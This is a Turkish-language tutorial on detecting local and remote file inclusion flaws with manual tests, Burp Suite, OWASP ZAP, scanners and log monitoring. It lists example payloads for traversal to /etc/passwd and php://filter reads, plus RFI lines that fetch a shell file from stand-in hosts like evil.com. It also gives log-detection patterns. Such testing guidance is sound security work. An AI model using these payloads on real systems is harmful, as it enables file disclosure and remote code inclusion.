## 📂 File Inclusion 6 - Tespit ve Analiz Yöntemleri  

File Inclusion (LFI / RFI) zafiyetlerini tespit etmek için hem manuel testler hem de otomatik araçlar kullanılabilir. Amaç, potansiyel olarak kullanıcı tarafından sağlanan dosya parametrelerinin sistem dosyaları, loglar veya uzaktan kaynaklarla manipüle edilip edilemeyeceğini doğrulamaktır.  

---

### 1. Manuel Test Adımları  
**Payload Örnekleri:**  
- http://target.com/index.php?page=../../../../etc/passwd  
- http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index  
- http://target.com/index.php?page=http://evil.com/shell.txt  

**Kullanım:**  
- URL parametrelerinde `page`, `file`, `inc`, `load` gibi dosya yükleme amaçlı parametreler test edilir.  
- Directory traversal ile sistem dosyaları hedeflenir.  
- Wrapper tabanlı payloadlar denenir.  

**Sonuç:**  
- Sistem dosyalarının içeriği görünüyorsa LFI,  
- Uzak dosya yüklenebiliyorsa RFI zafiyeti mevcuttur.  

---

### 2. Burp Suite Kullanımı  
**Adımlar:**  
1. Burp Proxy ile trafiği yakala.  
2. `page`, `file`, `include` gibi parametreleri intruder veya repeater üzerinde farklı payloadlarla dene.  
3. Payload listesi:  
   - ../../../../etc/passwd  
   - php://filter/convert.base64-encode/resource=index.php  
   - http://attacker.com/malicious.txt  

**Sonuç:**  
- Response içinde `/etc/passwd` benzeri çıktılar varsa LFI,  
- Response sunucudan attacker’a giden istek içeriyorsa RFI tespit edilir.  

---

### 3. OWASP ZAP Kullanımı  
**Kullanım:**  
- Spider ve Active Scan modülleri ile dosya parametreleri otomatik test edilir.  
- LFI/RFI payload listesinden varyasyonlar otomatik denenir.  

**Sonuç:**  
- ZAP raporunda “File Inclusion” başlığı altında açıklar listelenir.  

---

### 4. Otomatik Scanner’lar  
**Örnek Araçlar:**  
- Nikto  
- Wfuzz  
- Arachni  
- Nmap NSE scriptleri  

**Kullanım:**  
- Belirli parametrelerde payload brute force yapılır.  
- Scanner raporlarıyla potansiyel LFI/RFI noktaları belirlenir.  

**Sonuç:**  
- Hızlı şekilde olası zafiyetli parametreler listelenir.  
- Manuel doğrulama için rehber niteliği taşır.  

---

### 5. Log Analizi ve Monitoring  
**Kullanım:**  
- Apache/Nginx log dosyaları incelenir.  
- Şüpheli parametre denemeleri: `../`, `php://`, `http://` içeren istekler takip edilir.  
- SIEM veya IDS/IPS sistemleri ile anormal istekler izlenir.  

**Sonuç:**  
- Saldırganların payload denemeleri tespit edilir.  
- Erken aşamada müdahale imkanı sağlar.  

---

📌 **Özet:**  
- **Manuel testler** en net sonucu verir ancak zaman alıcıdır.  
- **Burp Suite ve OWASP ZAP** yarı otomatik ve güçlü test ortamları sunar.  
- **Otomatik scanner’lar** hızlı tarama sağlar ama false positive üretir.  
- **Log analizi ve monitoring**, saldırı girişimlerini tespit etmede kritik öneme sahiptir.  
